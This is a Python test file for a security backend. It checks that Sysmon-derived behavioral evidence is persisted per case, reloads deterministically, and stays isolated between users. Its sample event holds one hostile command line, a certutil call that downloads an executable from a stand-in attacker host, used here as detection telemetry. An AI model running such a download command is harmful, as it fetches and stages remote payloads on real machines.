"""P2 UI Slice-3 · Behavioral Evidence persistence — focused regressions.

Covers the P0 stabilisation directive (persist the Behavioral Timeline
against a workspace case so page reload reconstructs an identical
timeline deterministically). See ADR-0010v.

Guarantees locked here:
  1. `/api/behavioral/sysmon` with `case_id` auto-persists.
  2. `/api/behavioral/case/{case_id}` returns the exact envelope on
     reload (deterministic bytes for evidence_ref, per_event_mitre,
     correlation_state, raw_refs).
  3. Ingesting again with the same case_id UPSERTS and grows
     `adapter_history` (provenance chain, not silently overwritten).
  4. `DELETE /api/behavioral/case/{case_id}` detaches cleanly.
  5. Workspace isolation — a second user cannot read another user's
     attached envelope.
  6. GET on an unknown case_id returns 404 (no fabricated envelope).
  7. `/api/behavioral/attach` accepts an explicit envelope.
"""
from __future__ import annotations
import sys
from pathlib import Path

import pytest

_BACKEND = Path(__file__).resolve().parents[3]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))

from fastapi.testclient import TestClient   # noqa: E402
from server import app                       # noqa: E402
from deps import get_current_user            # noqa: E402
from routers.behavioral import _behav_col    # noqa: E402


@pytest.fixture
def alice_client():
    async def _u():
        return {"email": "alice@nivxray.com", "role": "analyst"}
    app.dependency_overrides[get_current_user] = _u
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides.pop(get_current_user, None)


@pytest.fixture(autouse=True)
def _clean_collection():
    _behav_col.delete_many({"case_id": {"$regex": "^case-p2test-"}})
    yield
    _behav_col.delete_many({"case_id": {"$regex": "^case-p2test-"}})


_EVENT1_XML = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Sysmon' />
    <EventID>1</EventID>
    <TimeCreated SystemTime='2026-08-12T09:00:00Z' />
    <Computer>WKS-04</Computer>
  </System>
  <EventData>
    <Data Name='UtcTime'>2026-08-12 09:00:00.000</Data>
    <Data Name='ProcessGuid'>{aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee}</Data>
    <Data Name='ProcessId'>4242</Data>
    <Data Name='Image'>C:\\Windows\\System32\\certutil.exe</Data>
    <Data Name='CommandLine'>certutil -urlcache -split -f https://evil.example/x.exe</Data>
    <Data Name='ParentImage'>C:\\Windows\\explorer.exe</Data>
    <Data Name='ParentProcessId'>1200</Data>
    <Data Name='ParentProcessGuid'>{11111111-2222-3333-4444-555555555555}</Data>
    <Data Name='ParentCommandLine'>C:\\Windows\\explorer.exe</Data>
    <Data Name='User'>CONTOSO\\alice</Data>
    <Data Name='LogonId'>0x3E7</Data>
    <Data Name='IntegrityLevel'>Medium</Data>
    <Data Name='CurrentDirectory'>C:\\Users\\alice</Data>
    <Data Name='Hashes'>SHA256=deadbeefcafe</Data>
  </EventData>
</Event>"""


def _ingest(client, case_id=None):
    body = {"xml": _EVENT1_XML}
    if case_id is not None:
        body["case_id"] = case_id
    r = client.post("/api/behavioral/sysmon", json=body)
    assert r.status_code == 200, r.text
    return r.json()


# ── 1. Ingest with case_id auto-persists ────────────────────────────────────
def test_ingest_with_case_id_auto_persists(alice_client):
    env = _ingest(alice_client, case_id="case-p2test-001")
    assert env["event_count"] == 1
    got = alice_client.get("/api/behavioral/case/case-p2test-001").json()
    assert got["case_id"] == "case-p2test-001"
    # The persisted envelope is byte-equivalent to the ingest response.
    assert got["envelope"]["evidence"] == env["evidence"]
    assert got["envelope"]["per_event_mitre"] == env["per_event_mitre"]
    assert got["envelope"]["parent_child_evidence"] == env["parent_child_evidence"]
    assert got["envelope"]["mitre_technique_ids"] == env["mitre_technique_ids"]


# ── 2. Deterministic reload contract ────────────────────────────────────────
def test_reload_deterministic_evidence_and_provenance(alice_client):
    env = _ingest(alice_client, case_id="case-p2test-002")
    r1 = alice_client.get("/api/behavioral/case/case-p2test-002").json()
    r2 = alice_client.get("/api/behavioral/case/case-p2test-002").json()
    assert r1["envelope"] == r2["envelope"]
    # evidence_ref is deterministic across reloads
    ev_refs_now = [e.get("evidence_ref") for e in env["evidence"]]
    ev_refs_reload = [e.get("evidence_ref") for e in r1["envelope"]["evidence"]]
    assert ev_refs_now == ev_refs_reload


# ── 3. Re-ingest UPSERTS and grows adapter_history ──────────────────────────
def test_reingest_upserts_and_appends_history(alice_client):
    _ingest(alice_client, case_id="case-p2test-003")
    _ingest(alice_client, case_id="case-p2test-003")
    got = alice_client.get("/api/behavioral/case/case-p2test-003").json()
    assert len(got["adapter_history"]) == 2
    # attached_at stays pinned to first ingest, updated_at moves forward.
    assert got["attached_at"] <= got["updated_at"]
    # Only ONE row per (user, case) — no duplication.
    docs = list(_behav_col.find({"case_id": "case-p2test-003"}))
    assert len(docs) == 1


# ── 4. Detach removes the row ───────────────────────────────────────────────
def test_detach_removes_row(alice_client):
    _ingest(alice_client, case_id="case-p2test-004")
    r = alice_client.delete("/api/behavioral/case/case-p2test-004")
    assert r.status_code == 200 and r.json()["deleted"] == 1
    r2 = alice_client.get("/api/behavioral/case/case-p2test-004")
    assert r2.status_code == 404


# ── 5. Workspace isolation — Bob cannot read Alice's case ───────────────────
def test_workspace_isolation_across_users():
    async def _alice(): return {"email": "alice@nivxray.com", "role": "analyst"}
    async def _bob():   return {"email": "bob@nivxray.com",   "role": "analyst"}

    app.dependency_overrides[get_current_user] = _alice
    try:
        c = TestClient(app)
        _ingest(c, case_id="case-p2test-005")
    finally:
        app.dependency_overrides.pop(get_current_user, None)

    app.dependency_overrides[get_current_user] = _bob
    try:
        c = TestClient(app)
        r = c.get("/api/behavioral/case/case-p2test-005")
    finally:
        app.dependency_overrides.pop(get_current_user, None)
    assert r.status_code == 404


# ── 6. Unknown case_id → 404, no fabricated envelope ────────────────────────
def test_unknown_case_id_returns_404(alice_client):
    r = alice_client.get("/api/behavioral/case/case-p2test-nope")
    assert r.status_code == 404
    body = r.json()
    assert body["detail"]["error"] == "no_behavioral_evidence"


# ── 7. Explicit /attach endpoint accepts an envelope ────────────────────────
def test_attach_endpoint_accepts_explicit_envelope(alice_client):
    env = _ingest(alice_client)  # no case_id → not auto-persisted
    # Nothing attached yet.
    r = alice_client.get("/api/behavioral/case/case-p2test-007")
    assert r.status_code == 404
    # Now attach explicitly.
    r = alice_client.post("/api/behavioral/attach",
                            json={"case_id": "case-p2test-007", "envelope": env})
    assert r.status_code == 200, r.text
    got = alice_client.get("/api/behavioral/case/case-p2test-007").json()
    assert got["envelope"] == env


# ── 8. No case_id on ingest → NOT persisted (opt-in) ────────────────────────
def test_ingest_without_case_id_does_not_persist(alice_client):
    _ingest(alice_client)  # no case_id
    # No row should be created for an implicit case_id.
    assert _behav_col.count_documents({"user_email": "alice@nivxray.com",
                                          "case_id": {"$regex": "^case-p2test-"}}) == 0
